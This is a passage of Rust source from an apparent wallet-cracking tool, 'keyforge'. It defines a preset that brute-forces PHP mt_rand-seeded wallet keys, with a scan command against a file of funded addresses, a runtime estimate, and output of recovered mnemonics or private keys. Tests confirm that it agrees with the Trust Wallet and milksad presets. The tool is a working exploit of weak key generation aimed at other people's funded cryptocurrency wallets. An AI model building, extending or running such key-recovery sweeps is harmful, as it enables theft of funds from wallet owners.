            "php-mt (no CVE -- a generator class, not a product)".into(),
            "PHP mt_rand: both engine modes are walked (>= 7.1 masks the low byte, \
             < 7.1 twists wrong and takes the high byte). What a given page did with \
             the bytes is unknown, so this scope is a guess and a miss here proves \
             nothing."
                .into(),
        ]
    }

    fn guide(&self) -> Guide {
        Guide {
            what: "PHP's mt_rand() is a predictable generator that was never meant for \
                   keys, and a site that seeded it with mt_srand() and built wallets \
                   from it left only about 4.3 billion possibilities. This is a pattern \
                   rather than one product, so it is a guess about what a site did.",
            affected: "Any site or script generating wallets with mt_rand(). Both PHP \
                       engine modes are covered: 7.1 and later, and the older mode that \
                       `mt_srand($s, MT_RAND_PHP)` still selects. No CVE -- this is a \
                       class of mistake, not a shipped bug.",
            command: "keyforge scan --vuln php-mt -f funded.bf",
            time: "Similar to a milksad sweep, around 9 days on a laptop, because the \
                   scope is deliberately wide. The seed has no time structure, so \
                   unlike milksad the range cannot be narrowed -- doing so leaves a hole.",
            hit: "A mnemonic phrase or a 64-character private key per line in \
                  matches.txt. A hit here tells you about one site, not about a \
                  population, and a clean sweep proves nothing about what the site did.",
        }
    }

    fn space(&self) -> Space {
        SEED_SPACE
    }

    /// 24 bytes is a `bx` habit -- its own default was 192-bit -- and nothing points at
    /// a PHP page choosing it. 16 and 32 are the sizes a hand-rolled generator reaches
    /// for.
    fn defaults(&self) -> Defaults {
        Defaults {
            material_sizes: vec![16, 32],
            routes: vec![Route::Bip39, Route::Bip32Seed, Route::PrivKey],
            paths: Vec::new(),
        }
    }

    fn expand(&self, point: Point<'_>, out: &mut Vec<Expanded>) {
        // PHP changed the default engine mode in 7.1 and a generator page carries no
        // version, so both eras are in scope -- and the modern one is `Libcxx` rather
        // than a stream of its own precisely because it *is* that stream.
        expand_seed(&[Dist::Libcxx, Dist::Php], point, out)
    }
}

#[cfg(test)]
mod vuln_tests {
    use super::*;

    /// Trust Wallet's whole economy over a milksad sweep is that its scope is narrower:
    /// one stream, one size, one route. If any of those widen, the preset has stopped
    /// describing the product.
    #[test]
    fn trust_wallet_is_the_narrowest_scope() {
        let d = TrustWallet.defaults();
        assert_eq!(d.material_sizes, vec![16]);
        assert_eq!(d.routes, vec![Route::Bip39]);

        let mut out = Vec::new();
        TrustWallet.expand(Point::Integer(1), &mut out);
        assert_eq!(out.len(), 1, "trust-wallet should walk exactly one stream");
    }

    /// Only milksad seeded from the clock. Getting this wrong in the other direction is
    /// the expensive mistake: it would invite a user to narrow a range whose seeds are
    /// spread uniformly over 2^32.
    #[test]
    fn only_milksad_narrows_its_range() {
        assert!(MilkSad.range_is_narrowable());
        assert!(!TrustWallet.range_is_narrowable());
        assert!(!PhpMt.range_is_narrowable());
    }

    /// Trust Wallet and modern PHP are the same byte stream as a macOS-built `bx`, so
    /// the same seed must expand to the same material through all three. This is the
    /// claim that justifies not giving each its own stream.
    #[test]
    fn the_three_products_sharing_a_stream_agree() {
        let (mut tw, mut php, mut bx) = (Vec::new(), Vec::new(), Vec::new());
        TrustWallet.expand(Point::Integer(500), &mut tw);
        PhpMt.expand(Point::Integer(500), &mut php);
        MilkSad.expand(Point::Integer(500), &mut bx);

        // libc++ is trust-wallet's only stream, php-mt's first, and milksad's second.
        assert_eq!(tw[0], php[0]);
        assert_eq!(tw[0], bx[1]);
        // And it is genuinely a different wallet from the libstdc++ stream.
        assert_ne!(bx[0], bx[1]);
    }
}
